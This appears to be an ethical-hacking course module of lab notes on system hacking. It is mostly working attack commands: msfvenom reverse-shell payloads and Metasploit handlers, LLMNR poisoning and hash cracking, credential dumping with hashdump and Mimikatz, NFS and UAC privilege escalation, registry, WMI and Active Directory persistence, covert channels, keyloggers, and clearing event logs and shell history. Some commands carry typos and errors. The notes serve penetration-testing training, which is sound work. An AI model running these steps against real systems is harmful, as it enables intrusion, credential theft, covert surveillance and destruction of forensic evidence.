# Module 6

## System Hacking
The ethical hacking phase where testers exploit vulnerabilities to obtain unauthorized entry into systems, demonstrating potential real-world attack paths.

**Objective**: Simulate how an attacker would exploit vulnerabilities to demonstrate risk.

**Approach**: Done only in lab environments or with explicit permission.

**Steps involved**:
- Exploitation of known vulnerabilities (using tools like Metasploit).
- Password attacks (brute-force, dictionary, credential stuffing).
- Exploiting misconfigurations (weak services, unpatched systems).
- Social engineering (phishing, malicious payloads).

---

### 1. Gain access to the system
The penetration testing phase where attackers exploit discovered vulnerabilities to enter a target system and establish unauthorized access.

#### 1.1 Perform Active Online Attack to Crack the System’s Password using Responder
LLMNR (link local multicast name resolution) and NBT-NS (netbios namer service) are used to performe name resolution on the local link.

Responder is LLMNR, NBT-NS, MDNS poisoner. By default the tool only responds to SMB.

**Steps**:
- Check the interfaces
  - `ifconfig`
- Now run responder on the interface.
  - `sudo responder -I ens33`
- Now when a user on the LAN try to access the unavailable share, responder will capture the hash.
- Logs are stored in /usr/share/responder folder. We will have a hash. Now crack it with John.
- On ubuntu you can install john as 
  - `sudo snap install john-the-ripper`
  - `sudo john /home/ubuntu/Responder/logs/SMB-NTLMv2-SSP-10.10.10.10.txt`

#### 1.2 Audit system passwords using Lophtcrack 
Windows tool can crack other password on remote machine if you know a single account utilizing SMB. Use password auditing. use password auditing wizard.

[L0phtCrack](https://l0phtcrack.gitlab.io/)

#### 1.3 Find Vulnerabilities on exploit sites

[Offensive Security’s Exploit Database Archive](https://www.exploit-db.com/)

#### 1.4 Gain Access to a Remote System using Reverse Shell Generator

**Steps**:
- Create msfvenom payload
  - `msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x64 LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.ex`
- Using apache to transfer the file
  - `mkdir /var/www/html/share`
  - `chmod -R 755 /var/www/html/share`
  - `chmod -R www-data:www-data /var/www/html/share`
  - `service apche2 start`
- Now run msfconsole
  - `msfconsole`
  - `use exploit/multi/handler`
- Set the payload type, port and IP and visit the IP to download the executable. Run it you will get the shell
- You can run the following commands in meterpreter
  - `sysinfo`  //get system information
- Upload file through meterpreter
- The powersploit priv escaltion script./usr/share/windows-resources/powersploit
  - `upload PowerUp.ps1 powerup.ps1`
- Now get shell
  - `shell`
- Now execute the script
  - `powershell -ExecutionPolicy bypass -command ". .//powerup.ps1;invoke-All-Checks"`
- Now exit it and to get a VNC from meterpreter use the following command
  - `run vnc`

[Online - Reverse Shell Generator](https://www.revshells.com/)

#### 1.5 Gain access to a system using armitage

**Steps**:
- GUI based msf
  - `service postgresql start`
- Now run armitage from Applications menu. Run intense scan. and then we can create a payload according to our target
- Once the victim opens the payload, we get the session.

#### 1.6 Gain access to system using Ninja Jonin

**Steps**:
- Ninja is installed on target and Jonin on attacker machine.
  - [GitHub](https://github.com/ErAz7/Ninja)
- We need to edit its config file to change the ip and port.
<img width="646" height="448" alt="image" src="https://github.com/user-attachments/assets/b623ed60-ae2b-4f70-ac26-458f3f80bcd2" />
- Open the Jonin listenere. it will catch the sessions.
  - `list`  //to list all sessions
  - `connect 1` //to connect to session
  - //to get to cmd
    - `change`
    - `cmd`
  - `help` //displays help

#### 1.7 Buffer Overflow
A security vulnerability that occurs when a program writes more data into a buffer (temporary storage) than it can hold, causing adjacent memory to be overwritten and potentially allowing attackers to execute malicious code.

- [Simple Stack Based Buffer Overflow Tutorial for Vulnserver · The Grey Corner](https://thegreycorner.com/2011/03/11/simple-stack-based-buffer-overflow.html)
- [Buffer Overflow | Pentesting Quick Reference OSCP and Beyond](https://notes.cavementech.com/pentesting-quick-reference/buffer-overflow)

**Tools required**:
- [Vulnerable server used for learning software exploitation](https://github.com/stephenbradshaw/vulnserver)
- [https://debugger.immunityinc.com/](https://debugger.immunityinc.com/)

#### 1.8 System  Password hacking
System Password Hacking is the process of attempting to crack or bypass authentication mechanisms to gain unauthorized access to a system, typically using techniques like brute force, dictionary attacks, phishing, or exploiting weak/hashed passwords.

- `pwDump7.exe> hashes.txt` //To Dump Windows SAM file hashes

---

### 2. Privilege Escalation
Process of exploiting vulnerabilities, misconfigurations, or weak permissions to gain higher-level access rights (e.g., from a normal user to administrator/root) within a system or network.

#### 2.1 Escalate privileges using Priv Esc tools

- [Linux Privilege Escalation for Beginners](https://rumble.com/v6pyem2-linux-privilege-escalation-for-beginners-ceh-v13-ilabs-walkthrough.html)

**Steps**:
- After you have a meterpreter session, use the following command to check the user
  - `getuid`
- We can use BeRoot tool to check for further attack vectors
  - [GitHub - AlessandroZ/BeRoot: Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
- Uploading with meterpreter. Files go to downloads folder by default
  - `upload beroot.exe`
- Now run shell and then execute the file. It will list the attack vectors.

**Ghostpack Seatbelt**
Seatbelt is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives

[GitHub - GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)

- Gather information with following commands
  - `Seatbelt.exe -group=all -full`
  - `Seatbelt.exe -group=system`
  - `Seatbelt.exe -group=user`
  - `Seatbelt.exe -group=misc`
 
- Dumping hashes in meterpreter
  - `hashdump` //or try the following
  - `use post/windows/gather/smart_hashdump`

#### 2.2 Post exploitation using Meterpreter

- Useful commands
  - `sysinfo`
  - `getuid`
  - `ifconfig`
  - `pwd` //(mostly downloads folder)
  - `ls`
  - `cat`
  - `cd`
  - `keyscan_start` //keylogger
  - `keyscan-dump`
  - `idletime`
- To modify the timestamp MACE (modified, accessed,created,entry) attributes
  - `timestomp secret.ext -m "2/11/2022 8:10:03"`
- To view timestamp entries
  - timestomp secret.ext -v
    - `-a` accessed
    - `-c` created
    - `-e` entry modified
- Finding files in meterpreter
  - `search -f flag*.txt` (in meterpreter)
- Hidden files in shell, First get the shell, then use the following command
  - dir /a:h
- List all running services in shell
  - `sc querytex type=service state=all`
- Other shell commands
  - `netsh firewall show state` //firewall state
  - `netsh firewall show config`
  - `wmic cpu get`
  - `wmic /node:"" product get name,version,vendor`
  - `wmic useraccount get name,sid`
  - `wmic os where Primary='TRUE' reboot` //restarts system
 
#### 2.3 Linux privilige esc with pkexec
Polkit (formerly PolicyKit) is a component for controlling system-wide privileges in Unix-like operating systems. It provides an organized way for non-privileged processes to communicate with privileged processes.

- Download and run the script
- [GitHub - berdav/CVE-2021-4034: CVE-2021-4034 1day](https://github.com/berdav/CVE-2021-4034)

#### 2.4 Linux priv esc with NFS misconfiguration

[Linux Privilege Escalation using Misconfigured NFS - Hacking Articles](https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/)

- Configure NFS in Victim
  - `sudo apt install nfs-kernel-server`
- Open /etc/exports file. This file contains the list of shares you want to share in the network. Add the following entry
  `- /home    *(rw,no_root_squash)`
> Home directory is shared and root user can perform read/write
- Restart the server
  - `sudo /etc/init.d/nfs-kernel-server restart`
- If we run the nmap scan now, port 2049 will appear as open.
<img width="553" height="221" alt="image" src="https://github.com/user-attachments/assets/68a68c0a-5af0-4e8a-88f3-2328243b7954" />

- In Attacking Machine Now install NFS commons
  - `sudo apt install nfs-commons`
- Check the mouted folder
  - `showmount -e 192.168.18.110`
- Now mount the share
  - `mkdir /tmp/nfs`
  - `sudo mount -t nfs 19.168.18.110:/home /tmp/nfs`
- Now move to the directory
  - `cd /tmp/nfs`
  - `cp /bin/bash .`
  - `chmod +s bash`   //allows the group to execute it
  - `ls -la bash`
- To check free space
  - `sudo df -h`
- Now ssh into the machine. Move to the shared directory and run bash and we will get the root shell
  - `cd /home`
  - `./bash -p`
- Useful commands post exploitation
  - `id`
  - `whoami`
  - `cat etc/cronjobs`
  - `find / -name *.txt -ls 2>/dev/null  to list all text files in system`
  - `route -n  host/network names in binary format`
- Now copy nano to current directory and then read shadow file
  - `sudo cp /bin/nano .`
  - `./nano -p /etc/shadow`
- To see running processes
  - `ps -ef`
- To view executable binaries
  - `find / -perm -4000 *.txt -ls 2>/dev/null`

#### 2.5 Escalate privliges bypassing UAC and sticky keys

- After you have a meterpreter session background it and then use the following exploit
  - `use exploit/windows/local/bypassuac_fodhelper`
- Then once you get a new meterpreter session, use the following command
  - `getsystem -t 1`
- To view the current sessions, you can use the following command.
  - `sessions -i*`
- Using sticky keys to priv esc on Win 11
- After the initial meterpreter session, use the following module.
  - `use post/windows/manage/sticky_keys`
- Now set the already priv escalated session in options and exploit it
- Now on Windows 11 , sign in with a normal user and once you press the stick keys(shift 5 times), you will get cmd as admin

#### 2.6 Priv esc using Mimikatz

- Metasploit has built in module for mimikatz call kiwi.
- First get a meterpreter session. Escalate privilege using bypassuac.
- In meterpreter load the module
  - `load kiwi`
  - `help kiwi` \\to see help
- To dump hashes
  - `lsa_dump_sam`
> We can also dump LSA Secrets using the following command. LSA secrets are used to manage local system security policy. it may contain passwords, IE passwords, SQL passwords etc
- change the password with kiwi with hash without knowing the original password.
  - `password_change -u raj -p 123 -P 9876`
  - `password_change -u raj -n <NTLM-hash> -P 1234`

---

### 3. Maintain Remote Access and Hide Malicious Activities
Remote code execution techniques are often performed after initially compromising a system and further expanding access to remote systems present on the target network.

#### 3.1 User system Monitoring with PowerSpy
Keylogger software

[Power Spy Lite](https://power-spy-software-lite.en.softonic.com/)

#### 3.2 System Monitoring with Spytech spyagent
Tool for monitoring user activity and capturing keystrokes.

[Spytech SpyAgent Spy Software](https://www.spytech-web.com/spyagent.shtml)

#### 3.3 User System Monitoring and Surveillance using Spyrix
Spyrix facilitates covert remote monitoring of user activities in real-time. It provides concealed surveillance via a secure web account, logging keystrokes with a keylogger, monitoring various platforms such as Facebook, WhatsApp, Skype, Email, etc. It also offers functionality of capturing screenshots, live viewing of screen and webcam feeds, continuous recording of screen and webcam activity.

#### 3.4 Maintain Persistence by Modifying Registry Run Keys
Registry keys labeled as Run and RunOnce are crafted to automatically run programs upon each user login to the system. Attackers can exploit these keys for persistence and privilege escalation.

**1st payload**
`msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Test.exe`

**2nd payload**
`msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=4444 -f exe > /home/attacker/Desktop/registry.exe`


**Steps**:
1. Copy both payloads to the target system.
2. Start listener in Kali:
  - `msfconsole`
  - `use exploit/multi/handler`
  - `set payload windows/meterpreter/reverse_tcp`
  - `set lhost 10.10.1.13`
  - `set lport 444`
3. Run 1st payload on target, gain shell.
4. Use `getuid`, then `background`.
5. Bypass UAC via:
  - `use exploit/windows/local/bypassuac_silentcleanup`
  - `set session 1`
  - `set LHOST 10.10.1.13`
  - `set TARGET 0`
  - `exploit`
6. Elevate privileges:
  - `getsystem -t 1`
  - `getuid`
  - `shell`
7. Add persistence:
  - `reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\registry.exe"`
8. Start listener with:
  - `msfconsole`
  - `use exploit/multi/handler`
  - `set payload windows/meterpreter/reverse_tcp`
  - `set lhost 10.10.1.13`
  - `set lport 4444`
  - `exploit`

#### 3.5 Hide files using NTFS ADS Streams

**Steps**:
1. Copy `calc.exe` to test folder.
2. Create text file:
 - `notepad readme.txt`
3. Append calc to text file:
  - `type calc.exe >readme.txt:calc.exe`
4. Create link to hidden file:
  - `mklink backdoor.exe readme.txt:calc.ex`
5. List hidden ADS streams:
  - `dir /r`

[MFT Forensics - NTFS ADS](https://cavementech.com/2022/05/mft-forensics.html#Alternate_Data_Streams_NTFS)

#### 3.6 Hide data using white space steganography
Conceal messages in ASCII text by adding white spaces at the end of lines. Uses **Snow** tool.

**Example**:
- SNOW.EXE -C -m "Hassan is my name" -p "magic" test.txt test2.txt
  - `-m` → hidden message  
  - `-p` → password  
  - `test.txt` → source file  
  - `test2.txt` → output file  
Extract hidden message:
- `SNOW.EXE -C -p "magic" test2.txt`


#### 3.7 Image Steganography using OpenStego and Stegonline

##### OpenStego
Select message file, cover file, and click **hide** to embed data. Extract similarly.

##### Stegonline
Upload file, configure settings, and embed/extract hidden data.

#### 8. Maintain persistence abusing boot or Logon autostart

- After gaining admin meterpreter, change directory:
  - `cd "C:\ProgramData\Start Menu\Programs\StartUp`
- Check the working directory with `pwd`
- Upload msfvenom payload here for persistence

**Other tools**:
- [Steghide](https://www.kali.org/tools/steghide/)
- [QuickCrypto](http://quickcrypto.com/free-steganography-software.html)

#### 9. Maintain Domain Persistence exploiting Active Directory Objects
AdminSDHolder container protects AD accounts/groups. Attackers can add user ACL to gain domain admin rights.

**Steps**:
1. Upload powertools:
  - `upload -r /home/attacker/Power-Tools-Master C:\users\Administrator\Downloads`
2. Start PowerShell:
  - `shell`
  - `powershell`
3. Import module and modify ACL:
  - `import-Module ./powerview.psm1`
  - `Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=system' -principalSamAccountName Martin -Verbose -Rights all`
4. Verify:
  - `Get-ObjectAcl -SamAccountName "Martin" -ResolveGUIDs`


#### 10. Priv Esc with WMI and maintain persistence
WMI event subscriptions can trigger code execution. Attackers use scripts for persistence.

**Steps**:
1. Upload `WMI-Persistence.ps1` script and payload.
2. In meterpreter:
  - `load powershell`
  - `powershell_shell`
3. Run script:
  - `Import-Module ./WMI-Persistence.ps1`
  - `install-Persistence -Trigger Startup -Payload "C:\users\administrators\downloads\exploit.exe"`


#### 11. Covert channels using covert_TCP
Covert_TCP manipulates TCP/IP headers to bypass firewalls and IDS/IPS.

**Steps**:
1. Download source:
  - wget https://raw.githubusercontent.com/cudeso/security-tools/master/networktools/covert/covert_tcp.c
2. Compile:
  - `sudo apt install gcc`
  - `cc -o covert_tcp covert_tcp.c`
3. On receiver:
  - `sudo ./covert_tcp -dest 192.168.18.144 -source 192.168.18.95 -source_port 8888 -dest_port 9999 -server -file /home/user/msg1.txt`
4. On sender:
  - `sudo ./covert_tcp -dest 192.168.18.144 -source 192.168.18.95 -source_port 9999 -dest_port 8888 -file /home/kali/msg.txt`

**Result**: Hidden data transmission over TCP headers.

---

### 4. Clear Logs to Hide the Evidence of Compromise
To remain undetected, intruders erase all evidence of security compromise from the system.

#### 4.1 Clear Windows Machine Logs using Various Utilities
The system log file contains events that are logged by OS components. These may include device changes, drivers, system changes, operations, and other events.

Utilities to clear logs include `Clear_Event_Viewer_Logs.bat`, `wevtutil`, and `cipher`.

**Clear_Event_Viewer_Logs.bat**  
Run as administrator. It deletes security, system, and application logs on the target system.

#### wevtutil
- `el | enum-logs` → lists log names  
- `wevtutil cl [log_name]` → clears a specific log (e.g., system, application, security)

#### Cipher.exe
- `cipher /w:[Drive or Folder or File Location]`
- Overwrites deleted files with 0s, 255s, and random numbers  
- Prevents recovery of deleted data  
- Useful to erase backup files created during encryption  

#### 4.2 Clear Linux Machine Logs using the BASH Shell
BASH stores history in `.bash_history`. Investigators can use this to track intrusions.

- Disable history saving:
  - `export HISTSIZE=0`
- Clear history:
  - `history -c`
- Delete current shell history:
  - `history -w`
- Shred history file:
  - `shred ~/.bash_history`
- Combine commands:
  - `shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit`

#### 4.3 View, Edit and Clear Audit Policies using Auditpol
`auditpol.exe` modifies audit security settings.

- View all audit policies:
  - `auditpol /get /category:*`
- Set auditing:
  - `auditpol /set /category:"system","account logon" /success:enable /failure:enable`
- Clear all audit policies:
  - `auditpol /clear /y`

#### 4.4 Clear Windows Logs using Different Utilities

**Bat Script**  
- Download script and run as administrator
[Clear All Event Logs in Event Viewer in Windows](https://www.tenforums.com/tutorials/16588-clear-all-event-logs-event-viewer-windows.html)

**wevtutil el**  
- List logs:
  - `wevtutil el`
- Clear a single log:
  - `wevtutil cl system`
- Clear all logs:
  - `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
 
**Cipher**  
- Overwrite deleted files:
  - `cipher /w:c:`
 
#### 3.5 Clear Linux Logs using Bash Shell

- Disable history:
  - `export HISTSIZE=0`
- Clear history:
  - `history -c`
- Clear current shell history:
  - `history -w`
- Shred history file:
  - `shred ~/.bash_history`
- View history file:
  - `more ~/.bash_history`
- Shred and clear:
  - `shred ~/.bash_history && cat /dev/null>.bash_history && history -c && exit`

#### 4.6 Hiding Artifacts in Windows and Linux

**Windows**
- Create directory:
  - `mkdir test`
- Hide folder:
  - `attrib +h +r +s test`
- Unhide folder:
  - `attrib -s -h -r test`
- Hide user accounts:
  - `net user test /add`
  - `net user test /active:yes`
  - `net user test /active:no`

**Linux**
Create hidden file (prefix with `.`).  

- View hidden files:
  - `ls -la`

#### 4.7 Clear Windows Logs using CCleaner
Useful for clearing logs, temporary files, and other artifacts.

[Download CCleaner | Clean, optimize & tune up your PC, free!](https://www.ccleaner.com/ccleaner/download)

---

